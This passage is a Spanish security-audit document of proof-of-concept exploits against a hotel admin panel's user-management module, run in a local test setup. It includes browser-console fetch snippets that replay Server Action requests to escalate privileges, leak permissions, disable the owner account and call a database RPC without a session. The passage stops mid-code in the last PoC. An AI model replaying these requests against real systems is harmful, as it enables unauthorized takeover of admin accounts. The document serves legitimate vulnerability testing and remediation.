# Fase 2 — PoCs de seguridad — Módulo Gestión de Usuarios (`users`)
**Responsable:** Joseph (Daniel Salas) · **Documento vivo**, se agrega una PoC por entrada confirmada.

> Entorno de pruebas: Supabase LOCAL (`pnpm --filter @hotel/db db:start`, migraciones+seed versionados,
> aislado del Supabase remoto compartido — ver `docs/proyecto-seguridad/plan-desarrollo.md` §4.1).
> `apps/panel-admin` corriendo en `http://localhost:3002`. Cuentas de prueba sembradas por
> `packages/db/supabase/seed/seed.sql` (ver tabla de credenciales en el contexto de la sesión; no son
> datos reales). Evidencias (capturas) en `docs/proyecto-seguridad/users/evidencias/` (primera ronda) y
> `docs/proyecto-seguridad/users/evidencias_r2/` (segunda ronda, con el panel DevTools → Network visible en
> cada captura — ver "Anexo — Re-ejecución completa" al final de este documento), generadas con el MCP de
> Playwright + capturas de escritorio reales (sin scripts headless).

> ### ⚠️ Metodología de reproducción — leer antes de las PoCs
>
> Los **UUIDs** de cuentas/invitaciones y los **`Next-Action` ids** que aparecen en los bloques de código
> de cada PoC son la evidencia **literal y real** de la ejecución documentada en esta sesión (así se
> registra un hallazgo en una auditoría/pentest real: con el request/response exacto capturado). **No son
> constantes universales** — van a ser distintos en cualquier otra ejecución del entorno:
>
> - El seed (`packages/db/supabase/seed/seed.sql`) genera **todos** los UUIDs (owner, admins, cuartos,
>   amenities, etc.) con `gen_random_uuid()` — son aleatorios en cada `pnpm --filter @hotel/db db:start`
>   / `db:reset`. El UUID del propio owner cambia entre ejecuciones, incluso en la misma máquina.
> - El header `Next-Action` que Next.js asigna a cada Server Action tampoco está garantizado estable
>   entre builds/reinicios del servidor de desarrollo — este repo no fija
>   `NEXT_SERVER_ACTIONS_ENCRYPTION_KEY`, así que también puede variar.
>
> **Para reproducir cualquier PoC de este documento en un entorno propio**, hay que repetir el *método*,
> no copiar los valores literales:
> 1. Iniciar sesión con la cuenta legítima que indica la tabla "Precondiciones" del PoC (o una equivalente
>    que vos mismo configures con los mismos permisos).
> 2. Abrir DevTools → pestaña **Network**, dejarla grabando.
> 3. Ejecutar **una vez** la acción legítima desde la UI (el botón real: "Invitar", "Guardar permisos",
>    "Desactivar", etc.).
> 4. En Network, ubicar la petición `POST` a la página (`/admin/...`) y copiar el header `Next-Action`
>    y el formato exacto del body — ese es tu "código postal" de esta sesión, va a ser distinto al que
>    aparece documentado abajo.
> 5. Repetir esa misma petición (mismo `Next-Action` recién capturado, mismo formato de body) pero desde
>    una sesión con menos privilegios, o apuntando a otro UUID destino, según corresponda al bypass de
>    cada PoC.
> 6. Los UUIDs de las cuentas objetivo se obtienen de la propia UI (tabla de administradores, listado de
>    invitaciones) o, como muestra J2-POC-2, filtrando UUIDs del HTML servido por una página bloqueada.
>
> El estado real y actualizado de las cuentas de prueba (cuáles siguen existiendo, cuáles se borraron
> como parte de una PoC) está fuera de este documento — es información operativa de la sesión de
> pruebas, no un hallazgo de seguridad en sí. El "Anexo — Re-ejecución completa" al final de este
> documento es el ejemplo concreto de esto: es la **segunda** vez que se repite el método completo, con
> valores literales distintos a los de la primera ejecución (documentada en el cuerpo principal de cada
> PoC), exactamente como describe este recuadro.

---

## J2-POC-1 — Bypass del guard de permisos en `createAdminAccountAction` (invitar administradores)

| Campo | Valor |
|---|---|
| **Vector** | Vector 1 — servidor |
| **OWASP** | A01:2021 — Broken Access Control (escalamiento vertical de privilegios) |
| **Subcategoría NIST CSF 2.0** | PR.AA-05 (permisos y autorizaciones gestionados según el principio de menor privilegio) |
| **Origen del hallazgo** | **Real** (no introducida) — corresponde a la observación **O1** de `users/fase-1-diagnostico.md` §3 |
| **Componente / archivo:línea** | `apps/panel-admin/src/features/invitations/services/createAdminAccountAction.ts:8-24` (Server Action de Next.js, `"use server"`, sin llamada a `requirePermission`); endpoint invocado vía header `Next-Action` en `POST /admin/invitations` |
| **Commit donde se reprodujo** | `9fed57e` (rama `security/users/fase2-pocs`, `develop` al 2026-10-16) |

### Precondiciones
- Entorno local levantado según §5 del contexto operativo (Supabase local + `panel-admin` en `:3002`).
- Dos cuentas sembradas: `owner@hotel.local` / `Owner1234!` (rol `owner`, todos los permisos) y
  `admin@hotel.local` / `Admin1234!` (rol `admin`, **solo** `view:dashboard` + `reservations:view` — sin
  `admins:invite`).

### Pasos reproducibles
1. **Baseline (sesión legítima).** Login como `owner@hotel.local` → `/admin/invitations` → botón
   "Invitar" → se crea una invitación de prueba (`baseline-owner-test@hotel.local`). Se inspecciona la
   petición de red generada por el formulario: `POST /admin/invitations` con header
   `Next-Action: 6023e40c6f0da1c104f50cdb47fa6ba82529075490` y body `multipart/form-data` con los campos
   `1_name`, `1_email` y `0=[null,"$K1"]` (convención de serialización de argumentos de Server Actions de
   Next.js/React Server Components).
2. **Confirmar el control a nivel de página.** Login como `admin@hotel.local` (bajo privilegio) →
   navegar directo a `/admin/invitations` → la página responde **403 "Acceso Restringido"** y el ítem
   "Invitaciones" ni siquiera aparece en el menú lateral. *(Evidencia: `J2-POC-1_01_admin_bajoPriv_403_en_UI_invitaciones.png`)*. Este control de página **sí funciona** — el problema está un nivel más abajo.
3. **Bypass.** Sin pasar por ningún botón ni formulario de la UI, desde la consola del navegador
   (misma sesión autenticada como `admin@hotel.local`, mismas cookies), se ejecuta directamente la
   petición a la Server Action capturada en el paso 1, reutilizando el mismo `Next-Action` id:
   ```js
   const fd = new FormData();
   fd.append('1_name', 'PWNED by J2-POC-1 (low-priv admin)');
   fd.append('1_email', 'pwned-j2poc1@hotel.local');
   fd.append('0', '[null,"$K1"]');
   const res = await fetch('/admin/invitations', {
     method: 'POST',
     headers: { 'Next-Action': '6023e40c6f0da1c104f50cdb47fa6ba82529075490', 'Accept': 'text/x-component' },
     body: fd,
     credentials: 'same-origin',
   });
   // => { status: 200, body: {"success":true,"email":"pwned-j2poc1@hotel.local"} }
   ```
4. **Verificación.** Login de nuevo como `owner@hotel.local` → `/admin/invitations` → la invitación
   `pwned-j2poc1@hotel.local` aparece en la lista de pendientes, creada por una cuenta sin el permiso
   `admins:invite`. *(Evidencia: `J2-POC-1_02_owner_ve_invitacion_creada_por_admin_bajoPriv.png`)*. Si se
   completa el flujo de activación de esa invitación, la cuenta resultante entra con rol `admin` —
   escalamiento vertical completo desde una cuenta de bajísimo privilegio.

### Resultado esperado vs. obtenido
- **Esperado:** `403`/error de autorización, igual que al navegar a la página.
- **Obtenido:** `200 OK`, `{"success":true,...}`, invitación de administrador creada.

### Impacto
Cualquier cuenta autenticada en el panel (incluso una con solo `view:dashboard`) puede crear invitaciones
de administrador sin el permiso `admins:invite`, simplemente conociendo el `Next-Action` id de la Server
Action (expuesto en cualquier respuesta de red del flujo legítimo, o incluso adivinable/reutilizable
porque Next.js lo deriva del hash del código del action, no de la sesión). El control de acceso implementado
en la página (`/admin/invitations` → 403) da una falsa sensación de seguridad: protege la *vista*, no la
*acción*. Esto habilita escalamiento vertical de privilegios y, encadenado con la activación de la cuenta
invitada, compromiso total del panel de administración.

### Causa raíz (para Fase 3 — J3.1)
`createAdminAccountAction` (líneas 8-24) no llama a `requirePermission("admins:invite")` antes de invocar
`createAdminAccount`; la autorización se delega enteramente al componente de página, que Next.js no aplica
a las Server Actions por separado.

---

## J2-POC-2 — IDOR de lectura en `getUserPermissionsService` (fuga de permisos de cualquier usuario)

| Campo | Valor |
|---|---|
| **Vector** | Vector 1 — servidor |
| **OWASP** | A01:2021 — Broken Access Control (Insecure Direct Object Reference / exposición de datos sensibles) |
| **Subcategoría NIST CSF 2.0** | PR.AA-05 (menor privilegio); PR.DS-01 (confidencialidad de datos en reposo/consulta) |
| **Origen del hallazgo** | **Real** (no introducida) — observación **O3** de `users/fase-1-diagnostico.md` §3 |
| **Componente / archivo:línea** | `apps/panel-admin/src/features/admins-table/services/permissions.ts:34-36` (`"use server"`, sin `requirePermission`, a diferencia de `getUserPermissionsList` en la misma línea 39 y `updateUserPermissions` en la línea 94 del mismo archivo, que sí lo llaman); endpoint vía header `Next-Action` en `POST /admin/admins` |
| **Commit donde se reprodujo** | `9fed57e` (rama `security/users/fase2-pocs`) |

### Precondiciones
- Mismo entorno y cuentas de J2-POC-1.
- UUID del usuario objetivo conocido por el atacante (en este PoC, obtenido trivialmente del propio HTML
  servido por `/admin/admins`, que embebe los ids de los 2 administradores en el payload de React Server
  Components aunque la página termine mostrando 403 a este usuario — ver paso 2).

### Pasos reproducibles
1. **Baseline (sesión legítima).** Login como `owner@hotel.local` → `/admin/admins` → se abre el drawer de
   permisos de `admin@hotel.local`. Se captura la petición: `POST /admin/admins`,
   header `Next-Action: 409b06a19cd4f0b05120ddc3101f7e31787f6154f3`, body `text/plain` con
   `["554c5cb8-ab74-4863-bdb5-c79cf24de187"]` (el id de `admin@hotel.local`), respuesta
   `["view:dashboard","reservations:view"]`.
2. **Confirmar el control a nivel de página.** Login como `admin@hotel.local` → navegar a `/admin/admins`
   → **403 "Acceso Restringido"** (igual que J2-POC-1; el ítem "Administradores" no aparece en el menú).
   *(Evidencia: `J2-POC-2_01_admin_bajoPriv_403_en_UI_administradores.png`)*. Desde esta misma sesión
   bloqueada, un `fetch('/admin/admins')` simple (GET, sin header `Next-Action`) para traer el documento
   HTML ya filtra los UUID de ambos administradores en el marcado RSC incluido en la respuesta —
   suficiente para obtener el id del owner (`24d6ab8a-b0d5-4575-9dc9-d6712c83ed74`) sin ningún otro acceso.
3. **Bypass.** Con la sesión de `admin@hotel.local` (rol `admin`, solo `view:dashboard` +
   `reservations:view`, **sin** `admins:view` ni `permissions:manage`), se llama directo a la Server
   Action capturada en el paso 1 pidiendo los permisos del **owner**:
   ```js
   const res = await fetch('/admin/admins', {
     method: 'POST',
     headers: {
       'Next-Action': '409b06a19cd4f0b05120ddc3101f7e31787f6154f3',
       'Accept': 'text/x-component',
       'Content-Type': 'text/plain;charset=UTF-8',
     },
     body: JSON.stringify(['24d6ab8a-b0d5-4575-9dc9-d6712c83ed74']),
     credentials: 'same-origin',
   });
   // => 200 OK
   // ["view:dashboard","reservations:view","reservations:edit","reservations:delete",
   //  "admins:view","admins:invite","admins:disable","admins:revoke","cms:manage",
   //  "permissions:manage","rooms:manage","invoices:view","clients:view","audit:view"]
   ```

### Resultado esperado vs. obtenido
- **Esperado:** `403`/error de autorización — igual que `/admin/admins` y que `getUserPermissionsList`
  (que sí valida `admins:view` en la línea 39 del mismo archivo).
- **Obtenido:** `200 OK` con el listado **completo** de los 14 permisos del owner, consultado por una
  cuenta que no tiene ni `admins:view` ni `permissions:manage`.

### Impacto
Cualquier sesión autenticada en el panel —sin importar su rol o permisos— puede enumerar el conjunto
exacto de permisos de **cualquier** usuario administrador cuyo UUID consiga (y, como muestra el paso 2,
el propio HTML de una página que debería estar bloqueada ya filtra esos UUID). Esto es reconocimiento
directo para priorizar a qué cuenta atacar después (p. ej., confirmar cuál es la única con
`permissions:manage` antes de intentar escalar vía J2-POC-1/futuro J2-POC-3), y es en sí mismo exposición
indebida de información de control de acceso (quién puede hacer qué en el sistema).

### Causa raíz (para Fase 3 — J3.1)
`getUserPermissionsService` (líneas 34-36) reenvía el `userId` recibido directo a `getUserPermissions`
del paquete `core` sin ninguna llamada a `requirePermission`, a diferencia de las otras dos funciones
exportadas por el mismo archivo (`getUserPermissionsList` y `updateUserPermissions`), que sí validan.
El parche debe exigir como mínimo `requirePermission(PERMISSIONS.ADMINS.VIEW)`, igual que su función
hermana de listado.

---

## J2-POC-3 — Delegación de permisos sin límite en `updateUserPermissions` (escalamiento vía "diputado confundido")

| Campo | Valor |
|---|---|
| **Vector** | Vector 1 — servidor |
| **OWASP** | A01:2021 — Broken Access Control (elevación de privilegios por delegación no acotada) |
| **Subcategoría NIST CSF 2.0** | PR.AA-05 (menor privilegio / separación de funciones); GV.RM-01 (proceso de gestión de riesgos no contempla este patrón de delegación) |
| **Origen del hallazgo** | **Real** (no introducida) — observación **O4** de `users/fase-1-diagnostico.md` §3 |
| **Componente / archivo:línea** | `apps/panel-admin/src/features/admins-table/services/permissions.ts:90-140` (`updateUserPermissions`, `"use server"`). Sí llama a `requirePermission(PERMISSIONS.PERMISSIONS.MANAGE)` (línea 94) y valida auto-modificación (líneas 109-112) y modificación del owner (líneas 116-125), pero **no valida que el conjunto de permisos otorgado sea subconjunto de los permisos del propio emisor**, ni que el `userId` destino sea realmente un admin activo; endpoint vía header `Next-Action` en `POST /admin/admins` |
| **Commit donde se reprodujo** | `9fed57e` (rama `security/users/fase2-pocs`) |

### Precondiciones
- Mismo entorno de J2-POC-1/J2-POC-2.
- Tres cuentas: `owner@hotel.local` / `Owner1234!` (rol `owner`); `admin@hotel.local` / `Admin1234!`
  (rol `admin`, reconfigurado por el propio owner para esta prueba con el **único** permiso
  `permissions:manage` — sin `admins:revoke`, sin `audit:view`, sin nada más); y una cuenta admin nueva,
  `j2poc3-target@hotel.local` / `Target1234!` (creada y activada para esta PoC vía el flujo normal de
  invitación, sin ningún permiso asignado de entrada).

### Pasos reproducibles
1. **Preparación (sesión legítima del owner).** Login como `owner@hotel.local` → `/admin/admins` → drawer
   de permisos de `admin@hotel.local` → se le deja **solo** `Gestionar Permisos` (`permissions:manage`),
   quitando `Ver Dashboard` y `Ver Reservas`. Se captura la Server Action real de guardado:
   `POST /admin/admins`, header `Next-Action: 6090dad2b1d560459c7d974eaba42afb031ebd8aba`, body
   `["554c5cb8-ab74-4863-bdb5-c79cf24de187",["permissions:manage"]]` → `200 OK`. Esto deja a
   `admin@hotel.local` como un "diputado confundido": tiene la *capacidad* de gestionar permisos de otros,
   pero no tiene en sí mismo ningún otro privilegio.
2. **Confirmar el control a nivel de página.** Login como `admin@hotel.local` → `/admin/dashboard` → 403
   (ya no tiene `view:dashboard`) → `/admin/admins` → también 403, y el menú lateral solo muestra
   "Métricas". *(Evidencia parcial de contexto, ver captura de paso 3, que incluye el 403 de fondo.)*
3. **Bypass.** Desde la consola del navegador, misma sesión de `admin@hotel.local`, se llama directo a la
   Server Action de guardado capturada en el paso 1, mandando como destino el UUID de `j2poc3-target`
   (`c4dfc04e-1a7f-4100-b31d-4d4a5597d692`) y pidiendo permisos que **el propio `admin@hotel.local` no
   tiene** (`admins:revoke`, `audit:view`), además del único que sí tiene (`permissions:manage`):
   ```js
   const res = await fetch('/admin/admins', {
     method: 'POST',
     headers: {
       'Next-Action': '6090dad2b1d560459c7d974eaba42afb031ebd8aba',
       'Accept': 'text/x-component',
       'Content-Type': 'text/plain;charset=UTF-8',
     },
     body: JSON.stringify(['c4dfc04e-1a7f-4100-b31d-4d4a5597d692',
       ['permissions:manage', 'admins:revoke', 'audit:view']]),
     credentials: 'same-origin',
   });
   // => 200 OK, {"success":true}
   ```
   *(Evidencia: `J2-POC-3_01_admin_bajoPriv_bypass_delegacion_sin_limite.png` — captura con overlay
   inyectado en la página mostrando la petición exacta, el `Next-Action`, el body y la respuesta
   `200 {"success":true}`, superpuesta sobre la pantalla de 403 de `/admin/admins` para esa misma sesión.)*
4. **Verificación.** Login de nuevo como `owner@hotel.local` → `/admin/admins` → drawer de permisos de
   `j2poc3-target@hotel.local` → aparecen marcados `Revocar Invitaciones` (`admins:revoke`),
   `Gestionar Permisos` (`permissions:manage`) y `Ver Registro de Auditoría` (`audit:view`). *(Evidencia:
   `J2-POC-3_02_owner_verifica_permisos_sobre_otorgados_j2poc3target.png`.)*

### Resultado esperado vs. obtenido
- **Esperado:** `403`/error de validación — `updateUserPermissions` debería rechazar la petición porque
  `admin@hotel.local` intenta otorgar permisos (`admins:revoke`, `audit:view`) que él mismo no posee.
- **Obtenido:** `200 OK`, `{"success":true}`. `j2poc3-target` termina con permisos que su "patrocinador"
  (`admin@hotel.local`) nunca tuvo.

### Impacto
Cualquier cuenta con el único permiso `permissions:manage` —el mínimo necesario para administrar
permisos de otros— puede fabricar una cuenta con **más** privilegios que los suyos propios, incluyendo
permisos que ni siquiera son visibles/usables desde su propia sesión (p. ej. `audit:view`, que le da acceso
al registro de auditoría a una cuenta que nunca pudo ver ese módulo). Encadenado con J2-POC-1 (crear la
cuenta admin inicial sin permiso) y J2-POC-2 (reconocer qué cuenta tiene qué permisos), esto permite a un
atacante que solo logró comprometer/crear una cuenta con `permissions:manage` construir, en una sola
llamada, una cuenta "sombra" con el conjunto de permisos que elija — incluida la totalidad de los 14
permisos del sistema si así lo decide — sin pasar nunca por una cuenta `owner`. Es la pieza que convierte
los hallazgos de IDOR/bypass anteriores en un camino completo hacia compromiso total y persistente del
panel de administración.

### Causa raíz (para Fase 3 — J3.1)
`updateUserPermissions` (líneas 90-140) valida *quién puede llamar la acción* (`requirePermission`,
auto-modificación, modificación del owner) pero nunca valida *qué puede entregar* quien la llama: falta
una comprobación de que el array de permisos solicitado sea subconjunto (`⊆`) de
`getUserPermissions(callerId)`, y falta validar que `userId` destino corresponda a un registro existente
en `user_permissions`/admin activo antes de escribir.

---

## J2-POC-4 — `supabase.auth.getSession()` usado para autorización en vez de `getUser()` (O12)

| Campo | Valor |
|---|---|
| **Vector** | Vector 1 — servidor |
| **OWASP** | A07:2021 — Identification and Authentication Failures (uso de datos de sesión no verificados contra el servidor de Auth) |
| **Subcategoría NIST CSF 2.0** | PR.AA-03 (los usuarios/procesos se autentican de forma proporcional al riesgo); DE.CM-01 (monitoreo que debería detectar sesiones manipuladas) |
| **Origen del hallazgo** | **Real** (no introducida) — observación **O12** de `users/fase-1-diagnostico.md` §3; advertencia emitida por el propio SDK de Supabase |
| **Componente / archivo:línea** | `apps/panel-admin/src/shared/auth/requirePermission.ts` (guard de autorización usado por **todas** las Server Actions/páginas protegidas, incluidas las de J2-POC-1/2/3) y `apps/panel-admin/src/shared/services/getInitialAuthStatus.ts` — ambos usan `supabase.auth.getSession()` en vez de `supabase.auth.getUser()` |
| **Commit donde se reprodujo** | `9fed57e` (rama `security/users/fase2-pocs`) |

### Precondiciones
- Cualquier sesión autenticada (se reprodujo con `owner@hotel.local`); no requiere ninguna acción especial,
  el warning aparece en **toda** carga de página del panel.

### Pasos reproducibles
1. Login con cualquier cuenta → navegar a cualquier ruta de `/admin/*` (se usó `/admin/dashboard`).
2. Abrir la consola del navegador (o, como en este caso, leer los mensajes de consola vía el MCP de
   Playwright) — aparecen, en cada carga, dos advertencias idénticas emitidas por el propio SDK de
   Supabase:
   ```
   Using the user object as returned from supabase.auth.getSession() or from some
   supabase.auth.onAuthStateChange() events could be insecure! This value comes directly from
   the storage medium (usually cookies on the server) and may not be authentic. Use
   supabase.auth.getUser() instead which authenticates the data by contacting the Supabase Auth server.
     Server @ src/shared/services/getInitialAuthStatus.ts:25
     Server @ src/shared/auth/requirePermission.ts:28
   ```
3. Se capturó la evidencia inyectando el texto exacto de ambas advertencias (extraídas con
   `browser_console_messages`, no inventadas) en un overlay visible sobre la propia página, para dejar
   constancia visual de que son mensajes reales del navegador y no una transcripción manual. *(Evidencia:
   `J2-POC-4_01_O12_getSession_warning_consola.png`.)*

### Resultado esperado vs. obtenido
- **Esperado:** El guard central de autorización (`requirePermission`) debería validar la sesión contra el
  servidor de Supabase Auth (`getUser()`) antes de decidir si una petición está autorizada.
- **Obtenido:** Usa `getSession()`, que **no** hace esa validación contra el servidor — confía en el
  contenido de la cookie tal cual llega.

### Impacto
`requirePermission` es el guard que, en teoría, debería ser la última línea de defensa para toda acción
protegida del panel (incluyendo las rutas que J2-POC-1/2/3 lograron saltarse desde un nivel más alto). Que
dependa de `getSession()` en vez de `getUser()` significa que la validez de la sesión se asume a partir de
una cookie leída directamente del *storage*, sin contactar al servidor de Auth para confirmar que el token
no fue revocado, expiró, o fue manipulado. No es, por sí mismo, una vía de bypass demostrada en esta fase
(no se logró explotarlo directamente — ver limitaciones), pero es un hallazgo real, confirmado en código y
en tiempo de ejecución por el propio framework, que **reduce la garantía** de todos los controles de
autorización del sistema, incluido el único guard que si funciona correctamente en J2-POC-1/2/3
(`requirePermission(PERMISSIONS.PERMISSIONS.MANAGE)` en `updateUserPermissions`).

### Causa raíz (para Fase 3 — J3.1)
Reemplazar `supabase.auth.getSession()` por `supabase.auth.getUser()` en
`apps/panel-admin/src/shared/auth/requirePermission.ts` y en
`apps/panel-admin/src/shared/services/getInitialAuthStatus.ts`, siguiendo la recomendación oficial de
Supabase (https://supabase.com/docs/guides/auth/server-side/nextjs).

### Limitaciones de esta prueba
No se intentó demostrar explotación activa de O12 (p. ej. inyectar una cookie de sesión falsificada) en
esta fase: requeriría manipular directamente el valor del JWT en la cookie `sb-127-auth-token`, algo que
quedó fuera de lo que se pudo automatizar en este entorno (ver limitaciones generales al final del
documento). Se documenta como hallazgo de código + advertencia en tiempo de ejecución, no como bypass
reproducido end-to-end.

---

## J2-POC-5 — `toggleAdminStatus` permite desactivar al owner y a cualquier destino, con estado dictado por el cliente (O5)

| Campo | Valor |
|---|---|
| **Vector** | Vector 3 — manipulación de parámetros / reglas de negocio |
| **OWASP** | A08:2021 — Software and Data Integrity Failures (el "nuevo estado" se deriva de un parámetro que envía el cliente, no de la fila real en BD); A01:2021 — Broken Access Control (sin protección de destino, a diferencia de `updateUserPermissions`) |
| **Subcategoría NIST CSF 2.0** | PR.AA-05 (menor privilegio / separación de funciones); PR.DS-10 (integridad de los datos en uso: el estado se confía al cliente en vez de leerse del servidor) |
| **Origen del hallazgo** | **Real** (no introducida) — observación **O5** de `users/fase-1-diagnostico.md` §3 |
| **Componente / archivo:línea** | `apps/panel-admin/src/features/admins-table/services/toggleAdminStatus.ts:9-26` (`"use server"`). Llama a `requirePermission(PERMISSIONS.ADMINS.DISABLE)` (línea 13) — el guard de *quién* puede llamar la acción sí funciona — pero no valida el *destino* (acepta al owner y a uno mismo) ni recalcula el estado actual en servidor: `update({ is_active: !isActive })` usa el booleano `isActive` que llega como segundo argumento desde el cliente en vez de leer el valor real de `profiles.is_active` antes de invertirlo; endpoint vía header `Next-Action` en `POST /admin/admins` |
| **Commit donde se reprodujo** | `9fed57e` (rama `security/users/fase2-pocs`) |

### Precondiciones
- Cuenta `owner@hotel.local` / `Owner1234!` (rol `owner`, sin ninguna protección especial contra esta
  acción).
- Cuenta `j2poc3-target@hotel.local` / `Target1234!` (rol `admin`), reconfigurada por el propio owner con
  el **único** permiso `Desactivar Administradores` (`admins:disable`) — nada de `admins:view`,
  `permissions:manage` ni ningún otro.

### Pasos reproducibles
1. **Preparación (sesión legítima del owner).** Login como `owner@hotel.local` → se deja a
   `j2poc3-target@hotel.local` con el único permiso `admins:disable`. Se captura la Server Action real de
   esta acción haciendo un toggle de prueba sobre una cuenta de bajo riesgo: `POST /admin/admins`, header
   `Next-Action: 7f89d617713f9e9176b60d316965d6c72fd6733eba`, body
   `["<uuid-admin>", <isActive-actual-que-ve-el-cliente>]` → `200 {"success":true}`. El segundo elemento
   del array es el estado **que el propio cliente dice que tiene ahora mismo** esa cuenta — el servidor no
   lo verifica contra la base de datos, solo hace `!isActive` con lo que le llega.
2. **Confirmar el control a nivel de página.** Login como `j2poc3-target@hotel.local` → `/admin/admins` →
   403 (no tiene `admins:view`) y el menú lateral solo muestra "Métricas", igual que en J2-POC-3.
3. **Bypass.** Desde la consola del navegador, misma sesión de `j2poc3-target@hotel.local`, se llama
   directo a la Server Action capturada en el paso 1, apuntando al **owner**
   (`24d6ab8a-b0d5-4575-9dc9-d6712c83ed74`, único usuario con rol `owner` del sistema):
   ```js
   const res = await fetch('/admin/admins', {
     method: 'POST',
     headers: {
       'Next-Action': '7f89d617713f9e9176b60d316965d6c72fd6733eba',
       'Accept': 'text/x-component',
       'Content-Type': 'text/plain;charset=UTF-8',
     },
     body: JSON.stringify(['24d6ab8a-b0d5-4575-9dc9-d6712c83ed74', true]),
     credentials: 'same-origin',
   });
   // => 200 OK, {"success":true}
   ```
   *(Evidencia: `J2-POC-5_01_bajoPriv_desactiva_al_owner.png` — overlay inyectado en la página mostrando
   la petición exacta, el `Next-Action`, el body con el UUID del owner y la respuesta `200
   {"success":true}`, superpuesto sobre la pantalla de 403 de `/admin/admins` para esa misma sesión de
   `j2poc3-target`.)*
4. **Verificación y restauración.** Se repite la misma llamada con `["24d6ab8a-...-ed74", false]` (desde
   la misma sesión de bajo privilegio, usando el mismo único permiso `admins:disable`) para reactivar al
   owner — confirmando que el "atacante" también puede revertir el ataque a voluntad sin necesitar ninguna
   otra cuenta. Se verificó el ciclo completo iniciando sesión de nuevo como `owner@hotel.local`: el login
   fue exitoso y el panel mostró el menú completo, confirmando `is_active = true` otra vez.

### Resultado esperado vs. obtenido
- **Esperado:** La acción debería, como mínimo, rechazar al owner como destino (igual que
  `updateUserPermissions` lo hace con su chequeo `OWNER_MODIFY`) y/o rechazar la auto-desactivación, y
  debería calcular el estado actual leyendo la fila real de `profiles` en vez de confiar en el parámetro
  que manda el cliente.
- **Obtenido:** `200 OK` en ambos sentidos (desactivar y reactivar al owner), sin ningún chequeo de
  destino ni de consistencia del estado.

### Impacto
Cualquier cuenta a la que se le otorgue el permiso `admins:disable` — incluso si, como en este caso, es el
**único** permiso que tiene — puede desactivar (sacar del panel, invalidar su sesión vía
`auth.admin.signOut`) a **cualquier** cuenta administrativa del sistema, **incluido el owner**, y también
puede reactivarla a voluntad. No existe ningún registro de que esta acción pase por las mismas
protecciones que sí tiene `updateUserPermissions` (`SELF_MODIFY`, `OWNER_MODIFY`). En un sistema con un
solo owner, esto es una vía de denegación de servicio dirigida (expulsar al único dueño real de la cuenta
justo cuando se necesita actuar) y, combinado con J2-POC-3 (delegación sin límite), permite a un atacante
con una sola cuenta de bajo privilegio reconfigurada mantener control total: puede silenciar
temporalmente al owner mientras hace cambios, y luego reactivarlo para no levantar sospechas.

### Causa raíz (para Fase 3 — J3.1 / J3.3)
`toggleAdminStatus` (líneas 9-26) necesita: (1) leer el `is_active` real desde `profiles` en vez de
recibirlo como parámetro del cliente, calculando el nuevo valor en servidor; (2) replicar los chequeos
`SELF_MODIFY`/`OWNER_MODIFY` que ya existen en `updateUserPermissions`, rechazando como destino tanto al
propio emisor como a cualquier cuenta con rol `owner`.

### Verificación adicional — ¿`signOut(adminId)` invalida la sesión real? (punto extra de O5, verificado por Seph)
En la sesión original de Claude no se verificó si `auth.admin.signOut(adminId)` (línea 24, que recibe un
`adminId`/UUID en vez del JWT de sesión que espera típicamente la API de Supabase, según nota de
`fase-1-diagnostico.md`) realmente invalida la sesión activa del owner en el navegador — habría requerido
mantener una segunda sesión del owner abierta en paralelo durante el ataque, lo cual se descartó por el
riesgo de perder el único acceso de owner disponible en el entorno de pruebas.

Seph ejecutó esta verificación manualmente con dos pestañas: la pestaña A con el owner logueado e inactivo
en `/admin/dashboard`, y desde la pestaña B (sesión de bajo privilegio) se llamó a `toggleAdminStatus` contra
el UUID del owner (`24d6ab8a-b0d5-4575-9dc9-d6712c83ed74`) con el mismo `Next-Action` de esta PoC. Resultado:
al volver a la pestaña A **sin recargar** y navegar a "Reservas", el owner recibió **403 — Acceso
Restringido** de inmediato.

**Conclusión: resultado negativo, no hay hallazgo adicional que agregar a O5.** `signOut(adminId)` con el
UUID del usuario **sí** invalida correctamente la sesión activa, a pesar de no recibir el JWT puntual de
esa sesión — la API de Supabase Admin revoca todas las sesiones de ese `user_id`, que es más amplio (y en
este caso, suficiente) que revocar una sola sesión por JWT. Se documenta como una duda cerrada, no como un
hallazgo nuevo.

---

## J2-POC-6 — `get_admins()` invocable sin ninguna sesión vía PostgREST (O9, `SECURITY DEFINER` sobre-expuesta)

| Campo | Valor |
|---|---|
| **Vector** | Vector 1 — servidor (capa de base de datos, por debajo de Next.js) |
| **OWASP** | A01:2021 — Broken Access Control (control de acceso ausente a nivel de base de datos); A05:2021 — Security Misconfiguration (función `SECURITY DEFINER` sin restringir su `EXECUTE`) |
| **Subcategoría NIST CSF 2.0** | PR.AA-05 (permisos y autorizaciones gestionados según menor privilegio); PR.PS-01 (configuración segura de los sistemas, línea base de hardening) |
| **Origen del hallazgo** | **Real** (no introducida) — observación **O9** de `users/fase-1-diagnostico.md` §3. Hallazgo ampliado respecto al diagnóstico original: no hace falta ningún JWT ni `psql` — se reproduce con **cero** autenticación. |
| **Componente / archivo:línea** | `packages/db/supabase/migrations/20260524000000_add_owner_to_admin_policies.sql:5-29` (`CREATE OR REPLACE FUNCTION public.get_admins() ... LANGUAGE sql SECURITY DEFINER`); expuesta automáticamente por PostgREST en `POST /rest/v1/rpc/get_admins`. Se confirmó, con `grep -rn "GRANT\|REVOKE" packages/db/supabase/migrations/`, que **ninguna** migración del repo otorga ni revoca explícitamente el `EXECUTE` de esta función — queda con el `GRANT EXECUTE ... TO PUBLIC` por defecto de Postgres para funciones nuevas. |
| **Commit donde se reprodujo** | `9fed57e` (rama `security/users/fase2-pocs`) |

### Precondiciones
- Ninguna. No se requiere cuenta, sesión, cookie ni token de ningún tipo — solo la URL del Supabase local
  (`http://127.0.0.1:54321`) y la `apikey` (anon) **pública**, hardcodeada en `.env.local` del repo y en el
  bundle JS que se sirve a cualquier visitante del sitio.

### Pasos reproducibles
1. **Confirmar que no hay sesión.** Se abrió el navegador directamente en `/auth/login` (pantalla de login,
   sin haber iniciado sesión en ningún momento de esa pestaña) para dejar constancia visual de que no existe
   cookie de sesión activa.
2. **Bypass.** Desde la consola de esa misma pestaña **no autenticada**, llamada directa al RPC de
   PostgREST, usando únicamente la `apikey` anon pública y **sin** header `Authorization`:
   ```js
   const res = await fetch('http://127.0.0.1:54321/rest/v1/rpc/get_admins', {
     method: 'POST',
     headers: {
       'apikey': '<anon key pública de .env.local>',
       'Content-Type': 'application/json',
       // Sin Authorization — sin sesión de ningún tipo
     },
     body: JSON.stringify({}),
   });
   // => 200 OK
   // [{"id":"554c5cb8-...","email":"admin@hotel.local","full_name":"Admin User","is_active":true,"role":"admin",...},
